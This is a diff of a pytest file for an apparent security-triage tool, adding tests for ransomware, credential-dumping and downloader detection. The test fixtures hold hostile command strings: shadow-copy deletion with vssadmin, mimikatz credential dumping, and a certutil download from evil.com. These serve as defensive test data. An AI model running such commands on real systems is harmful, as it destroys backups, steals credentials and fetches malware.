@@ -9,13 +9,13 @@ from __future__ import annotations
 import pytest
 from pydantic import ValidationError
 
+from src.anomaly import AnomalyDetector
+from src.data_generator import generate_attack_scenario, generate_baseline_events
 from src.models import Event, TriageResult
-from src.rules import rule_score
-from src.anomaly import AnomalyDetector, anomaly_score
-from src.scorer import RiskScorer
-from src.triage import explain_incident, _deterministic_fallback_triage
 from src.remediate import log_mitigation
-from src.data_generator import generate_baseline_events, generate_attack_scenario
+from src.rules import rule_score
+from src.scorer import RiskScorer
+from src.triage import _deterministic_fallback_triage, explain_incident
 
 
 def test_event_validation_success():
@@ -139,7 +139,7 @@ def test_remediation_simulation_guarantee():
 
 def test_temporal_burst_bonus():
     """Verify that 3+ events scoring > 30 within sliding window trigger +20 burst bonus."""
-    from datetime import datetime, timezone, timedelta
+    from datetime import datetime, timedelta, timezone
 
     scorer = RiskScorer(
         threshold=100,
@@ -192,4 +192,53 @@ def test_temporal_burst_bonus():
     # Reset user clears burst history
     scorer.reset_user("burst_victim")
     assert scorer.get_user_score("burst_victim") == 0
+
+
+def test_deterministic_fallback_triage():
+    """Verify deterministic fallback triage returns valid TriageResult across threat types."""
+    # Ransomware event
+    ransom_event = Event(
+        user="victim.ransom",
+        files_touched_per_min=500,
+        new_country=False,
+        process_chain="vssadmin.exe delete shadows /all /quiet",
+        cpu_percent=90.0,
+    )
+    res = _deterministic_fallback_triage(ransom_event, score=140)
+    assert isinstance(res, TriageResult)
+    assert res.threat_type == "Ransomware Encryption Activity"
+    assert res.severity == "critical"
+    assert "shadow copy" in res.plain_summary
+    assert "taskkill" in res.mitigation_command
+
+    # Credential dumping event
+    cred_event = Event(
+        user="victim.cred",
+        files_touched_per_min=10,
+        new_country=True,
+        process_chain="powershell.exe -> mimikatz.exe sekurlsa::logonpasswords",
+        cpu_percent=30.0,
+    )
+    res_cred = _deterministic_fallback_triage(cred_event, score=120)
+    assert isinstance(res_cred, TriageResult)
+    assert res_cred.threat_type == "Credential Dumping Attack"
+    assert res_cred.severity == "critical"
+
+
+def test_explain_incident_returns_valid_triage_result():
+    """Verify explain_incident returns a valid TriageResult (live or fallback)."""
+    event = Event(
+        user="victim.test",
+        files_touched_per_min=350,
+        new_country=False,
+        process_chain="winword.exe -> cmd.exe -> certutil.exe -urlcache -split -f http://evil.com/p.exe",
+        cpu_percent=75.0,
+    )
+    triage = explain_incident(event, score=110)
+    assert isinstance(triage, TriageResult)
+    assert triage.severity in ("low", "medium", "high", "critical")
+    assert len(triage.threat_type) > 0
+    assert len(triage.plain_summary) > 0
+    assert len(triage.mitigation_command) > 0
+
 
